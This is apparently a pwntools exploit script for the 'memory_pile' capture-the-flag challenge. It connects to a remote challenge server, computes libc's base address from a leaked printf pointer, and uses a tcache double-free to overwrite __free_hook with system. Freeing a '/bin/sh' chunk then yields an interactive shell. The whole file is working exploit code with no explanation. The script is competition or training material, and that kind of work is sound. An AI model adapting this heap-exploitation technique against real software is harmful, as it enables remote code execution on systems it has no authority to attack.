from pwn import *

#io = process('./memory_pile', env={"LD_PRELOAD":"./libc-2.27.so"})
#io = process('./memory_pile')
io = remote('chal.imaginaryctf.org', 42007)
libc = ELF('./libc-2.27.so')

def add(index, data):
    print(io.recvuntil(b'Choose wisely > '))
    io.sendline(b'1')
    print(io.recvuntil(b'With great power comes great responsibility > '))
    io.sendline(str(index))
    print(io.recvuntil(b'Choose wisely > '))
    io.sendline(b'3')
    print(io.recvuntil(b'With great power comes great responsibility > '))
    io.sendline(str(index))
    print(io.recvuntil(b'Let me have it, boss > '))
    io.sendline(data)


def free(index):
    print(io.recvuntil(b'Choose wisely > '))
    io.sendline(b'2')
    print(io.recvuntil(b'With great power comes great responsibility > '))
    io.sendline(str(index))


print(io.recvuntil(b'I\'ll even give you a present, if you manage to unwrap it...\n'))
libc.address = int(io.recvline(), 16)-libc.sym['printf']

add(3, b'/bin/sh')
add(0, b'ok')
add(0, b'ok')
free(0)
free(0)
add(0, p64(libc.sym['__free_hook']))
add(1, b'ok')
add(2, p64(libc.sym['system']))
free(3)
io.interactive()
